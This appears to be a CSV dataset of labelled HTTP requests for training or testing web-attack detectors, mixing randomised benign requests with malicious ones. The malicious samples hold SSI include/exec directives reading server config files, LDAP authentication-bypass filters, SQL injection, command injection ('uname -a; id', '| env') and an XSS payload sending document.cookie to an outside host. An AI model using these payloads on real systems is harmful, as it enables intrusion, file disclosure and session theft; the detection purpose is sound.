attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"POST /@zA0zx/iP_/j321OQs4XAtmpXkk/L8bR/@NvusrcxpIiql8nscript/i2OmLygB64z-dL-hjshR/v5FmQj/mb_-qRQM8M2ua/ezo2saesi3sR/DOLCocwget-BAmER1.js? HTTP/1.0
Content-Length: 181
Content-Language: e
Content-Encoding: compress
Content-Location: /eferdUl/jn4ldiL/seKyei.fgf
Content-MD5: b2l0dGJlZWhycmhodG0xbg==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 16 Mar 10 06:09:34 UTC
Last-Modified: Thu, 15 Apr 04 10:14:06 CET
Host: 79.97.17.22
Connection: close
Accept: */*
Accept-Charset: *;q=0.1
Accept-Encoding: gzip
Accept-Language: *;q=0.6
Cache-Control: no-store
Client-ip: 165.127.88.109
Cookie: qEgohee=ac;6b=qa1delete7;hqL42inpImkiq=Tu nt;Hsdc=41488;niaysoiidtoulwc=9802995984;qldT29tqmr=3tdlIRtIejsrh5rfet
Cookie2: $Version=""1""
Date: Sun, 26 Jun 05 09:16:19 UTC
ETag: W/""oz7H7O1v7SSfqgo7H@R8""
Expect: 100-continue
From: osuu@ioeO.org
If-Modified-Since: Wed, 10 Oct 07 20:23:54 GMT
If-Unmodified-Since: Sat, 03 Apr 04 09:15:27 CET
If-Match: *
If-None-Match: ""5suLSKCK7dr6mhP""
If-Range: Tue, 05 Sep 06 22:40:59 CET
Max-Forwards: 46
MIME-Version: 8.8
Pragma: es=4uT
Proxy-Authorization: Digest nc=eFb2E0C2
Authorization: Basic ZW5lamU0YTprdHg1czU=
Range: 0401-,-401,485260-5
Referer: http://www.9mnis4.gov/tm6l/d1amzs.swf
TE: chunked;q=0.9
Trailer: Connection
User-Agent: aiHeh7swmehwfGsucc
UA-CPU: x86
UA-Disp: 979,352,16
UA-OS: WinNT
UA-Color: color16
UA-Pixels: 5493x774
Via: tEipa/8.7 www.f2tp51n.gif, rOekR/3.9 175.107.42.72:16281, 6.5 www.IoaglisE.tiff:67
Transfer-Encoding: identity
Upgrade: dnb/4.0
Warning: 222 www.oeeeay.gif:8841 ""nriml4ld"" ""Mon, 28 Aug 06 16:14:52 GMT""
X-Forwarded-For: 89.218.230.173
X-Serial-Number: 074898
----: ----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

c8fmcpa7=c8s&wsRYeesGaria=7sss&lso0hu5s=7&xeClenos8o=e c&nhrdiei5Mriiu=Rnroindhoab3kscnv&oeSslszncatnfo=nl6i&l1oRzweu=3615149&bwtsieloee7=pqY55.1E5SP&asesf6b=ebtolunIdivretsptmpefol",4915,1952,xml_test-4915,pkdd,
SSI,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close

redirect=<!--#exec cmd=""whoami"" -->&id=1640",,210,patt-ssi-0640,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
LDAP Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

username=(&(sn=administrator)(password=MYKE)) : OK&id=1214",,214,patt-ldap-injection-0214,PayloadsAllTheThings,(&(sn=administrator)(password=MYKE)) : OK
,hard,-2.0,benign,"PUT /siJ0/EwsoeeyeKLekEuj/lskG8acceptjSsamff1cWI/ihu4vxTq7DzOZkU.bin? HTTP/1.1
Content-Length: 285
Content-Language: 2yrcay
Content-Encoding: deflate
Content-Location: http://eoiase.it/i0ta2ts/rasd/oelm8mo/gnshihc.zip
Content-MD5: NHRlU29qaGVlYWU5ZWlpeQ==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 23 Jun 09 11:37:44 CET
Last-Modified: Sun, 20 Aug 06 23:06:14 GMT
Host: www.5glHueSdd.ch
Connection: ikapm
Accept: video/*;q=0.3, image/gif;q=0.4, audio/*;q=0.2
Accept-Charset: iso-8859-2;q=0.4, iso-10646-ucs-2, us-ascii, iso-8859-5, euc-cn
Accept-Encoding: *
Accept-Language: *;q=0.7
Cache-Control: min-fresh=04
Client-ip: 105.40.117.107
Cookie: he=vl9eru9rpatSpnTlF
Cookie2: $Version=""339""
Date: Thu, 11 Oct 07 12:41:02 CET
ETag: ""KEI.oj4E9Hw.Jzu""
Expect: 100-continue
From: elh3tsco@Oytt10o9e.org
If-Modified-Since: Tue, 22 Dec 09 18:33:59 CET
If-Unmodified-Since: Sun, 18 Mar 07 09:49:30 CET
If-Match: *
If-None-Match: *
If-Range: Thu, 30 Oct 08 08:06:29 GMT
Max-Forwards: 521
MIME-Version: 9.1
Pragma: tEnarimu='rsaiy4m'
Proxy-Authorization: Digest cnonce=""ri3ml""
Authorization: Basic c09sMHJhaTphZWZlamU=
Range: -85
Referer: /XNWt/rzhAtLt/iqaatt.sh
TE: chunked;q=0.8,gzip;q=0.3,trailers
Trailer: Connection
User-Agent: Mozilla/2.3 (compatible; Konqueror/8.2; Windows NT; hmhjttns; atsnaa)
UA-CPU: x86
UA-Disp: 654,4575,16
UA-OS: Win98
UA-Color: color32
UA-Pixels: 995x590
Via: s9Opi/3.0 28.29.83.134:585, 0.0 www.dalfIrvx.html, oiiuh/8.9 www.tzd7hr.jpeg:81
Transfer-Encoding: bsktot; htve9uo=naht
Upgrade: r9e3sj/2.9, ssde/1.5, 28o5l/1.1, cra/1.9, oir/5.1
Warning: 306 75.33.43.3 ""apg0"" ""Sun, 22 Jul 07 01:14:23 UTC""
X-Forwarded-For: 148.127.25.65
X-Serial-Number: 18830507621799
----: -------------------------------
~~~~~: ~~~~~~~~~~~~~~~~

sinoels=elu&QtsCC=iNa cbatw&hfYrine=p6tg&oQKW2uYQm=cRtFIW&wc0ec=x 7&ciOomnenAern=uraeahy4rszswdug&ek9iSeCt=oa%nexecwp- 3t&7JXxEIbodywwOxM=b5zyVieEOO&H.iHCpconnectH=fcye'2rhn&Ttosteaeelfa='tconnect&pfi=awV1M40RQq&e9Y7dROeaes=xe&jtAtieyosado2=06&vaywfnsacigaS=7&fan=oconnectdcuowao",34149,2098,xml_test-34149,pkdd,
SSI,medium,4.0,malicious,"POST /aQtaheyemoerttttq2zz/ng5nsttzh/m4hXcVgQDVrKzxJxhVw.png? HTTP/1.0
Content-Length: 204
Content-Language: 001le,jtvrh,s
Content-Encoding: gzip
Content-Location: /wmee.tar
Content-MD5: aWVudDhueml0ZmtmdGN0bQ==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Mon, 24 Jan 05 12:32:50 GMT
Host: www.hmhc5eo.biz
Connection: psdeoel
Accept: */*;q=0.7
Accept-Charset: macintosh;q=0.5, x-mac-turkish;q=0.1, windows-1255
Accept-Encoding: *
Accept-Language: rct-l5eBie;q=0.2, s6a-d37te;q=0.1, Fd-i, Oeakoo3-535Qie, ts-er
Cache-Control: min-fresh=074
Client-ip: 207.175.239.116
Cookie: 2semiwosl=mautsdca;DurmUccu7=idTAdeaeTiTmx;null@BsystemWreplace=<!-- #include  virtual=""/etc/httpd/httpd.conf""     -->;kltincfWegn5is=3shSrm?nFRilike\ qH;vesOOr6iadef6=ciy
Cookie2: $Version=""5""
Date: Mon, 13 Aug 07 20:48:52 CET
ETag: W/""ObvsAtI5axOhRDw""
Expect: 100-continue
If-Modified-Since: Thu, 05 Feb 04 12:56:50 GMT
If-Unmodified-Since: Sat, 13 Jun 09 15:39:53 CET
If-Match: ""Q5xXgJ-bb4w8lb6""
If-None-Match: *
If-Range: *
Max-Forwards: 00
Pragma: ht6=errpe8en
Authorization: NTLM ZWwwNzVxdzVtdnJpOHZoMGFkbXVPdXJzZGNheGFqc2RsZWVzaXQ=
Range: 925705-880015,-14,-60
Referer: /itgae/9hCtt/etizoi/yksb.msf
TE: trailers,trailers,trailers
Trailer: If-None-Match
User-Agent: Mozilla/8.3 (X11; U; Solaris 2.8; la-hr; rv:2.2.0) Gecko/57166561
UA-CPU: StrongARM
UA-Disp: 2470,688,8
UA-Pixels: 1061x625
Via: 9.2 www.e4tlmsy3.html:0, 5.6 www.eoopE.html
Transfer-Encoding: gzip
Upgrade: SemoE7/6.0, et69/4.6, 41p/4.8, tpres/9.7, oesti/2.8
X-Serial-Number: 237531832779
----: --------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Rr=90&arSb5thrq=gbetweenntos1tlandeu4f&egnd=31&sAhdR=163760&trepargInli=8bKb3&ecreRs=)i3eertl&pcfi76iesmi=2241636437&lDot7inAera=60098&2qbwVV@2J= eele&$ wgettAe@ies5l&temy=056&Elxlwny=oN@hA-yh75",39857,1874,xml_test-39857,pkdd,
,hard,-2.0,benign,"PUT /iriRV22K/jAX-fBPE/eptgaaTi.css? HTTP/1.0
Content-Length: 253
Content-Language: svlr,ect,igt
Content-Encoding: gzip
Content-Location: http://www.gafgc3n.com/aha9l/esee/if3e8/ntice/danYR.avi
Content-MD5: ZmFFZ2h3c1R0aHFtaGxhZA==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 18 Feb 05 11:21:39 CET
Last-Modified: Thu, 13 Apr 06 22:32:58 UTC
Host: www.teYt.st:80
Connection: ioevom
Accept: image/gif;q=0.6
Accept-Charset: x-mac-arabic;q=0.0, x-mac-greek, shift_jis, x-mac-hebrew
Accept-Encoding: *
Accept-Language: edMr-slahi, 0-y1htr;q=0.8, t-eefh5e, oyio-frooD;q=0.0
Cache-Control: max-age=019
Client-ip: 113.146.215.236
Cookie: 2ctou=E98sle;hataeSnee=tslissadpgnvoa3s;mceocnHnantofts=oPB-FT7EV3;at=6320536;dews0t=iemees;gJXD=insajttdi
Cookie2: $Version=""8""
Date: Fri, 07 Mar 08 06:47:32 UTC
ETag: W/""NzY5F3Hh7ldE_SPuFA""
Expect: 100-continue
From: Utso@nihreoOf.st
If-Modified-Since: Wed, 11 Feb 04 21:12:36 GMT
If-Unmodified-Since: Thu, 17 May 07 11:18:57 CET
If-Match: ""cdHet-oA14boKtx29bk""
If-None-Match: *
If-Range: *
Max-Forwards: 30
MIME-Version: 0.1
Pragma: wes0pU=ci0tz
Proxy-Authorization: oeut alhdcdwS=ederee
Authorization: Digest uri=/ibjliiq/lModeb/1seoqiit/rsleh.mpg
Range: 97019-,-6
Referer: /tsss/domlA/nnrd3Mr/ectn/Ziiole.css
TE: deflate;q=0.3,gzip,chunked;q=0.1
Trailer: Connection
User-Agent: avtetDed/8.3.7.9.4
UA-CPU: PowerPC
UA-Disp: 0976,3445,16
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 3257x6651
Via: 1.8 230.254.36.111, 2.1 137.228.209.176:87382
Transfer-Encoding: identity
Upgrade: Zmrps/0.2
Warning: 207 108.67.175.165 ""2eeoi"" ""Sun, 02 Sep 07 12:24:19 GMT""
X-Forwarded-For: 199.124.172.154
X-Serial-Number: 6339975961282
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

m2nodedDatN=mniin]%rfel&ntaliomfa4aqu=9125726&ghgnuz5e=3797573&xirgsafacn8tray=2025104&rst53i2taor=kuwL05&tee5iv=jTrqMs&pmtasn=jtq8pn&eu=3oshfX&V-Wwindow.openZcI=mtr&ittntarsvmoo5=t hdl&wnmrdl4ay4Xsaes= 'o""bErreS""vsbIdropt)&RisG6K=2625641336",33663,2036,xml_test-33663,pkdd,
SQLi,medium,3.5,malicious,"GET /eaeltuIge/wbdrhe/ogswe/YWYFPspcb/aninfD/80wxmlEYvgH_Zgkphp/Ycmd4MPsx_r/h3e8eYti/shWGax2IekpQpUneiz/RnFzudiaTtzh.bin?onUone6iuhS=35&eaiIul7oteEm=elttt+a%5Biqi%5C+i&e5kemlmeqtinlsn=x%3Ea&occndritetZSE2=gntteis8hxnt&fmhkI=9lntSanh+update6MoErlrna&qEr=ete7t7a0&wi=ercpeD&ehreu6ianurth=tqzODZTjKANz&5sbshEgnen=fH%40&Wm5Y38openS3=n9lehrgtNrmeeo&8nn8ne=hE6hlb_&rwknToii=tersa+nb&MYhlwlsFt4where8p=e_%40_mAnSwa8X&s21=n%2F+iNaslmtvn&eneheadeEj=osoeAsis HTTP/1.1
Host: 104.169.197.84
Connection: thsand
Accept: text/html, application/x-tar;q=0.6
Accept-Charset: *;q=0.5
Accept-Encoding: deflate;q=0.0, identity, deflate, identity
Accept-Language: *
Cache-Control: no-store
Client-ip: 237.136.70.223
Cookie: orthi=';   shutdown--;2ieOoZf6l=tdpseh hoboot.inialeOnrcpw;62VexecgPV_=mYVUBLtjouM;PC8Gj=3;swxxhn=649485344
Cookie2: $Version=""7""
Date: Thu, 05 Feb 09 06:56:20 UTC
ETag: W/""g_lFTiKjT0lFJ077""
Expect: nrtl=nlejage;ovtlr3u
From: q5mitc@si2ecNlvy.uk
If-Modified-Since: Wed, 26 Oct 05 10:27:47 UTC
If-Unmodified-Since: Wed, 25 May 05 14:32:56 UTC
If-Match: ""MoILtabDkTt2nX@QIqZ.""
If-None-Match: *
If-Range: *
Max-Forwards: 0690
MIME-Version: 9.9
Pragma: no-cache
Proxy-Authorization: Digest cnonce=""ifbj""
Authorization: ge8k sztt=to0c3
Range: 9-769078
Referer: http://www.aori.com/lealaa4e/eletdsQ0/vx0nhch/lcioeS/iNcqyh.rar
TE: trailers
Trailer: Trailer
User-Agent: Mozilla/1.1 (compatible; lsrcn3; Solaris; beiaetEI; ner8eiehm; r0epd1jae2)
UA-CPU: x86
UA-Disp: 8432,789,8
UA-OS: Win95
UA-Color: color16
Via: 3.2 118.141.8.201
Transfer-Encoding: compress
Upgrade: 1aa8/1.9, huin/7.7, ykium/1.0
Warning: 540 4.59.66.37 ""ldiyu46vmehap"" ""Tue, 26 Feb 08 07:23:38 GMT""
X-Forwarded-For: 90.26.199.114
X-Serial-Number: 672862
----: -------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41291,1854,xml_test-41291,pkdd,
Command Injection,medium,4.0,malicious,"POST /7knoocequtin/ASmfi/a7tw/aiih/EreMEeQrtsEw0wmhw/iXJQN@oH1NEeAJ9D/gcRXNv4cAEZ_vtmkzaw/vtyuSqsantu.php4? HTTP/1.0
Content-Length: 112
Content-Language: o2,oais
Content-Encoding: compress
Content-Location: /temtT2iA/a8mnn/04we2.dll
Content-MD5: RXJuZEVQYXVyb21TOWloOQ==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Tue, 11 Jul 06 12:02:35 UTC
Host: www.a3iLe.biz:567
Connection: yaldys9t
Accept: application/*
Accept-Charset: *
Accept-Encoding:      ; echo    ;  w        ;   uname   -a     ; id
Accept-Language: te-hRSt9
Cache-Control: min-fresh=4
Date: Thu, 15 Feb 07 06:02:29 UTC
ETag: ""Rv1LLSK7-v.hQZkKgvvd""
Expect: keid=ot9eB
If-Modified-Since: Thu, 31 May 07 07:38:34 UTC
If-Unmodified-Since: Fri, 08 Jan 10 19:04:35 GMT
If-Match: ""qVXi9vXDCty5FWKpx""
If-None-Match: ""r2iqMX2XQFOkm_IDvq3r""
If-Range: Mon, 05 Sep 05 04:21:28 CET
Max-Forwards: 150
Proxy-Authorization: Basic QWxyaXJBYTpaZWZi
Referer: /ineda/re8lancn.txt
User-Agent: egTlomeqfeieesmr
Transfer-Encoding: deflate
Upgrade: ioUL/8.7, mwhe/5.7, s80I/2.4
Warning: 047 www.eshezI.shtml ""yosEgrnaD8dhigeecbst"" 
X-Forwarded-For: 149.148.1.115
----: ------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~

@tr@=tfPznvq&ahxU4o=l@zu&ivlfngtrme1r8te=9&.R9kv=nsqKjG6Z2sxL&itDnoh20eMl6aet=neeriaer1mNoo7t&CxdMV=h7eusdseak",43628,1335,xml_test-43628,pkdd,
Command Injection,medium,,malicious,"GET /cgi-bin/test?host=| env HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close

",,0,kaggle-cmdi-021,KaggleWebPayloads,| env
SQLi,medium,3.0,malicious,"GET /cv@io6yUTqIAO3338/txnumFhutart2ees4.exe?DseiEteohehS=hf2nqT&9ZJpxHt@YI6H=D%27%2Bha&G@fDbetweenr_7processing-instructionls=NS%2Fpi&3frgdcee=94827432&y0nupt=OR+++++%27ozt%27++%3D++%27Sim%27%2B%27ple%27&Bhwsliedi=oq&R0DCH.-Iy4Y9=9603302&itswaerRiehN=5adjSUmbs&tow94segn=p&tecaeeyels9tar=L0sepperl7sneDh&Ososohjeh=sock_stream%5Cohm+lj+%27Rhesltt%7EI HTTP/1.0
Host: 180.207.119.56
Connection: keep-alive
Accept: video/quicktime;q=0.1, application/postscript;q=0.1
Accept-Charset: *;q=0.0
Accept-Encoding: *;q=0.7
Accept-Language: kohtn-epcer
Cache-Control: volAaS='bst'
Client-ip: 88.68.143.39
Cookie: z_36E4Q=irl~oeiu0o]htfxr phpp;tp=8027
Cookie2: $Version=""0""
Date: Wed, 06 Sep 06 21:44:11 UTC
ETag: W/""tK08tBHPggtEMtZ1I-o""
Expect: tdqm
From: oseas@soacs.biz
If-Modified-Since: Fri, 07 Jan 05 04:28:03 UTC
If-Unmodified-Since: Thu, 16 Sep 04 23:48:45 UTC
If-Match: ""kuCO08u3.sj9VMq6A_""
If-None-Match: ""63gK@fFCw5-Zlst@4L0""
If-Range: ""kUR6PynGPM1Y0p4Tg""
Max-Forwards: 5456
MIME-Version: 3.7
Pragma: no-cache
Proxy-Authorization: NTLM bW9zbzZtbGVydGMyZXM3RW1vaXRSNGR1b2hyem51ZXY=
Authorization: ebDoe1 e2o6goee=Atbb0aec
Range: 0-,-4,4860-288700
Referer: http://www.cSuowjh.gov/ayxte9/eobp.swf
TE: gzip;q=0.8,trailers,chunked
Trailer: Trailer
User-Agent: een2see (oB@q7Zlo)
UA-CPU: MIPS
UA-Disp: 942,8019,8
UA-OS: FreeBSD
UA-Color: color8
UA-Pixels: 232x3893
Via: HTTP/9.3 www.tieg.jpeg, HTTP/5.1 www.ittNf6.jpg
Transfer-Encoding: eloove; yhsdN=leuiowt
Upgrade: eelO/2.0, utnt/9.3, aSn/6.5
Warning: 553 www.mekn.jpg ""dieiIfit2dki8e"" 
X-Forwarded-For: 236.249.18.77
X-Serial-Number: 611965021882313
----: -----------------------------
~~~~~: ~~~~~~~~~~~~",41655,1694,xml_test-41655,pkdd,
SSI,medium,3.5,malicious,"PUT /vJ4Je.n7ShM6fSid-ZdW/4homePp/pLRs./Bglfdjrerms3lnbS8Ft/ctnetlhiehveennmt.css? HTTP/1.1
Content-Length: 241
Content-Language: toou
Content-Encoding: compress
Content-MD5: c25kaWJhdG9IY3VSaDVvdQ==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Fri, 04 Apr 08 07:09:00 UTC
Host: 134.94.189.236:80
Connection: hest
Accept-Charset: cp-950;q=0.8, iso-8859-8;q=0.5, iso-10646-ucs-2;q=0.2, windows-1258
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-transform
Cookie: rci51asrnemi=01148636;2urrik7T=aAho;lnekrnuL=<!--  #include virtual=""d:\windows\autoexec.bat""     -->;7neestdallRh=760
Date: Sat, 24 Jan 09 24:59:37 GMT
If-Modified-Since: Fri, 10 Dec 04 20:47:17 UTC
If-Unmodified-Since: Wed, 24 Mar 04 06:00:39 CET
If-Match: ""yUkUKS6oX3W@B6l___""
If-None-Match: ""cikFbziowBrYoz@2@""
Pragma: 9='tl2ob'
Referer: http://aEaihht.org/nesnitgr/ktsetnt.mdb
TE: gzip,gzip;q=0.2
User-Agent: Mozilla/6.8 (X11; U; Linux i586 4.1; 1d-o4; rv:2.9.4) Gecko/91145192
----: -----------------------------------------

cyuxveeejahwi=eg4&Lchhezn5rneiNt=neat5;&ajlarmnN=234565846&hObtueic=n4yn2YlBms&zhanemhsi=oedw70GpC_Z&hdna0eaXEeutni=33092&zatobuoia8bd=8732517&zjIRHwCsr=a sa- lxmlerljbon ecataadmin&ooaodTnnokm=hprxeo&9aTJHts5y=ivwJF-Y-Y&esl1d=nn'tfhhrep",40719,1283,xml_test-40719,pkdd,
XSS,medium,3.5,malicious,"POST /o.Cz4QBdsi3w/lxHZmacSMUYshsO/sHY9@8Bjdo/iaa/tbdts/3ZAS16AdkQ/vah1tsnae1l2lo.shtml? HTTP/1.0
Content-Length: 325
Content-Language: w9io8h7r,edlgeaer,fslu
Content-Encoding: gzip
Content-Location: /aSeo/tanioq/rs1neh/unel/Cgs3.aspx
Content-MD5: c2l0dmVkM3RxbHJ1c2VhbA==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 29 Aug 09 17:16:15 CET
Last-Modified: Mon, 04 Jan 10 24:32:48 CET
Host: www.natn05.ch:80
Connection: keep-alive
Accept: text/*;q=0.1
Accept-Charset: windows-1257;q=0.3, x-mac-turkish, iso-2022-kr, windows-1253;q=0.9, hz-gb-2312
Accept-Encoding: deflate;q=0.4, deflate;q=0.2
Accept-Language: eoWe8-dadEctd
Cache-Control: no-cache
Client-ip: 202.152.82.23
Cookie2: $Version=""609""
Date: Sat, 04 Sep 04 15:25:55 GMT
ETag: ""uvWwqLBwApGZcIhP""
Expect: 100-continue
If-Modified-Since: Thu, 31 May 07 21:50:24 GMT
If-Unmodified-Since: Wed, 04 Mar 09 15:16:27 CET
If-Match: *
If-None-Match: ""SR@YflsFIEMGg2pm""
If-Range: *
Max-Forwards: 3
Pragma: no-cache
Proxy-Authorization: Basic Z212dGU6ZXJyZWRkZQ==
Referer: /e4Egwn.bin
TE: gzip;q=0.8,trailers,gzip
User-Agent: Mozilla/7.0 (Machintosh; U; PPC 8.9; 1a-3g; rv:0.1.9) Gecko/06069979
UA-Color: color32
UA-Pixels: 1199x1516
Transfer-Encoding: deflate
Warning: 169 130.84.60.97 ""veojxxdsnqtnotxti"" ""Sat, 18 Mar 06 20:44:29 GMT""

hCoifszi2M=n3nq  no7apsEI/croe&r&1QPadminhXFKJ0aF1=dlntNmsbweqtmpn0sa&pntaa7=wGRm0z&ztorc=3&cyNzNi=833&hgtinopt=<body     onload  =  ""     [document.location.replace ('http://www.maonerin.com/cgi-bin/nisttoit.cgi'+document.cookie);]     ""  >&6o3n=8275&omn=nralTe+ElnrnLzpasswd(;0",46763,1618,xml_test-46763,pkdd,
LDAP Injection,medium,,malicious,"POST /auth HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: close

redirect=admin*)((|userpassword=*)&id=1049",,194,patt-ldap-injection-0049,PayloadsAllTheThings,admin*)((|userpassword=*)
,hard,-2.0,benign,"PUT /catk-9S/naaoveueeerrfoIsn/zyiframelKinputLh3q/lr1-Usin/Pwn1m3heeperpywa9s/hWpijj4gY.asp? HTTP/1.1
Content-Length: 99
Content-Language: ktedsx,6
Content-Encoding: gzip
Content-Location: http://3oEh.it/aaeead/20obeF.sh
Content-MD5: MG9ibmRhaTNsZWhubXlsVw==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 12 Apr 07 09:55:50 UTC
Last-Modified: Sun, 03 Jan 10 13:45:56 UTC
Host: 207.216.64.29
Connection: close
Accept: */*;q=0.9
Accept-Charset: *
Accept-Encoding: deflate
Accept-Language: *
Cache-Control: hrOe='baijie9'
Client-ip: 72.91.226.93
Cookie: BSNFm=7ecs;id=hha\d;srfai=rsaT;yorrtuploaee=ahpeoengnsne;atuvne21njE=accepttejq5Adar;eNIAittel5Ld= w0;(+sShe1n:0(lhws
Cookie2: $Version=""774""
Date: Tue, 17 Feb 09 23:20:27 UTC
ETag: W/""oqC62Vkc92.YfFJ""
Expect: 100-continue
From: rh3qx@gsao.net
If-Modified-Since: Tue, 19 Jul 05 03:09:42 GMT
If-Unmodified-Since: Mon, 05 Jan 04 07:25:48 UTC
If-Match: ""uZfg9@farve8J_GCCnJ""
If-None-Match: *
If-Range: Fri, 22 Dec 06 04:06:37 UTC
Max-Forwards: 31
MIME-Version: 6.4
Pragma: e1gxqa='heqi'
Proxy-Authorization: Digest cnonce=""p1qwbnT""
Authorization: NTLM U2VpWnhyYW9lb2F0c25ydHdvYTVvZWVJUmVocjJ0dW90dA==
Range: 85423-38937,6-5478
Referer: /ntsew/eFesntez/sc33oaae/hdhho/se7t.js
TE: deflate,gzip;q=0.6,trailers
Trailer: Authorization
User-Agent: Mozilla/3.6 (compatible; dbcbsedhta; Linux i586; h4empe; sDe9ye; Tte7bIrh)
UA-CPU: MIPS
UA-Disp: 3339,068,16
UA-OS: Linux
UA-Color: color16
UA-Pixels: 604x596
Via: FTP/4.2 31.97.24.184
Transfer-Encoding: gzip
Upgrade: zscdse/7.1, 1ntn/4.8, caw/0.2, nhnaei/2.6, jrla3/2.1
Warning: 774 98.7.54.149 ""snI8ejlpssn"" ""Tue, 19 Apr 05 06:05:00 CET""
X-Forwarded-For: 9.134.134.209
X-Serial-Number: 91470301728015054
----: --------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

es=m1sAFn5hIXBau&scrrtri0hna=awotSsock_streams&tru7ehsc=3&er4teDkmodhpss=mfh2tof&oa8se=mvR.CJEg0txW",4437,1949,xml_test-4437,pkdd,
SSI,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close

username=<!--#include file=""..\..\web.config"" -->&id=1577",,224,patt-ssi-0577,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
LDAP Injection,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close

file=(&(sn=administrator)(password=M*)) : OK&id=1209",,212,patt-ldap-injection-0209,PayloadsAllTheThings,(&(sn=administrator)(password=M*)) : OK
